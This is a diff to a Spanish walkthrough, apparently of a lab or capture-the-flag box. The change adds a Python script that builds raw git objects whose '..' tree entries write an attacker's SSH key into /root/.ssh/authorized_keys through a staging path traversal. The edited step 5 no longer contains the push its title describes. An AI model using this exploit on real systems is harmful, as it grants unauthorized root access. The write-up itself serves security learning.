@@ -468,38 +468,54 @@ Donde `stage_path` es `/home/git/template-staging` y `filepath` proviene del rep
 4. **Creamos un script de construcción** (`/tmp/build.py`) que genera un commit con un archivo que explota el path traversal:
 
    ```python
-   import os
-   import subprocess
+    #!/usr/bin/env python3
+    import hashlib,zlib,os,subprocess,sys,time
+    
+    def write_obj(data,t):
+        h=("%s %d"%(t,len(data))).encode()+b"\x00"
+        s=h+data
+        sha=hashlib.sha1(s).hexdigest()
+        d=os.path.join(".git","objects",sha[:2])
+        os.makedirs(d,exist_ok=True)
+        p=os.path.join(d,sha[2:])
+        if not os.path.exists(p):
+            open(p,"wb").write(zlib.compress(s))
+        return sha
+    
+    def entry(mode,name,sha):
+        return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)
+    
+    if not os.path.isdir(".git"):
+        print("Run inside git repo");sys.exit(1)
+    r=subprocess.run(["cat","/tmp/malicious_key.pub"],capture_output=True,text=True)
+    if r.returncode!=0:
+        print("ssh-keygen -t rsa -b 4096 -f /tmp/malicious_key -N ''");sys.exit(1)
+    key=r.stdout.strip()+"\n"
+    blob=write_obj(key.encode(),"blob")
+    readme=write_obj(b"# Template\n","blob")
+    ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
+    cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
+    fir=write_obj(entry("40000","root",cur),"tree")
+    for i in range(4):
+        fir=write_obj(entry("40000","..",fir),"tree")
+    root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
+    ts=int(time.time())
+    c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
+    sha=write_obj(c.encode(),"commit")
+    os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
+    open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
+    print("Done: "+sha)
+    ```
 
-   # Crear estructura de directorios
-   os.makedirs('rce', exist_ok=True)
-   os.chdir('rce')
-
-   # Inicializar repositorio
-   subprocess.run(['git', 'init'], check=True)
-
-   # Crear archivo malicioso que apunta a authorized_keys
-   os.makedirs('../../../../root/.ssh', exist_ok=True)
-   with open('../../../../root/.ssh/authorized_keys', 'w') as f:
-       f.write('ssh-rsa AAAAB3NzaC1yc2EAAA... jones@nexus\n')
-
-   # Añadir y commitear
-   subprocess.run(['git', 'add', '../../../../root/.ssh/authorized_keys'], check=True)
-   subprocess.run(['git', 'commit', '-m', 'rce'], check=True)
-   ```
-
-   Ejecutamos el script:
-
-   ```bash
-   python3 /tmp/build.py
-   ```
 
 5. **Subimos el repositorio**:
 
    ```bash
-   cd /tmp/rce
-   git remote add origin http://localhost:3000/jones/rce.git
-   git push -f origin main
+   cd /tmp
+   rm -rf rce
+   mkdir rce && cd rce
+   git init
+   python3 /tmp/build.py
    ```
 
 6. **Verificamos que el timer haya ejecutado el script** y sobrescrito `authorized_keys`:
